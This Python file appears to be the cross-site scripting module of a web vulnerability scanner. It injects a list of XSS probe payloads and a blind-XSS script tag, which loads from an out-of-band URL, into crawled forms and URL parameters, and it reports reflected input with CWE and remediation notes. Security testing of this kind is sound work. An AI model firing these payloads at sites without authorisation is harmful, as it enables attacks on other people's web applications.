from __future__ import annotations

import asyncio
from urllib.parse import parse_qs, urlencode, urlparse

from phantomrecon.analyzers.base import BaseAnalyzer
from phantomrecon.logger import log
from phantomrecon.models.finding import CrawlResult, Finding
from phantomrecon.utils.timing import ResponseAnalyzer


class XSSAnalyzer(BaseAnalyzer):
    """Cross-Site Scripting detection: reflected, DOM-based, blind."""

    name = "xss"
    category = "injection"

    PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "{{7*7}}",
        "${7*7}",
    ]

    DOM_PATTERNS = [
        r"document\.write\s*\(",
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"eval\s*\(",
        r"setTimeout\s*\(\s*['\"]",
        r"setInterval\s*\(\s*['\"]",
        r"window\.location\s*=",
        r"location\.href\s*=",
        r"\.insertAdjacentHTML\s*\(",
    ]

    async def analyze(self, crawl_result: CrawlResult, oob_url: str = "") -> list[Finding]:
        findings: list[Finding] = []
        targets = self._build_targets(crawl_result)

        tasks = [self._test_reflected_xss(url, param, method, fields) for url, param, method, fields in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Finding):
                findings.append(result)

        if oob_url:
            oob_task = self._test_blind_xss(crawl_result, oob_url)
            oob_result = await oob_task
            if oob_result:
                findings.append(oob_result)

        log.info(f"  [bold]{self.name}:[/] {len(findings)} findings")
        return findings

    def _build_targets(self, cr: CrawlResult) -> list[tuple[str, str, str, dict]]:
        targets = []
        for form in cr.forms:
            for param in form["fields"]:
                targets.append((form["url"], param, form["method"], form["fields"]))
        for param, urls in cr.params.items():
            for url in urls[:3]:
                targets.append((url, param, "GET", {}))
        return targets

    async def _test_reflected_xss(self, url: str, param: str, method: str, fields: dict) -> Finding | None:
        for payload in self.PAYLOADS:
            try:
                if method == "GET":
                    test_url = self._inject_get(url, param, payload)
                    resp = await self.client.get(test_url)
                else:
                    data = {**fields, param: payload}
                    resp = await self.client.post(url, data=data)

                if ResponseAnalyzer.detect_reflection(resp.text, payload):
                    return self._make_finding(
                        rule_id="XSS-001",
                        name="Reflected XSS",
                        severity="HIGH",
                        confidence=0.88,
                        url=url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        evidence=f"Payload reflected in response body: {payload[:100]}",
                        description="User input is reflected without sanitization, enabling script execution.",
                        remediation="HTML-encode all user input. Implement Content-Security-Policy header.",
                        cwe="CWE-79",
                        owasp="A03:2021",
                    )
            except Exception:
                continue
        return None

    async def _test_blind_xss(self, cr: CrawlResult, oob_url: str) -> Finding | None:

        blind_payload = f'<script src="{oob_url}/xss"></script>'
        targets = self._build_targets(cr)[:5]

        for url, param, method, fields in targets:
            try:
                if method == "GET":
                    test_url = self._inject_get(url, param, blind_payload)
                    await self.client.get(test_url)
                else:
                    data = {**fields, param: blind_payload}
                    await self.client.post(url, data=data)
            except Exception:
                continue

        return None

    def _inject_get(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        flat = {k: v[0] for k, v in params.items()}
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(flat)}"
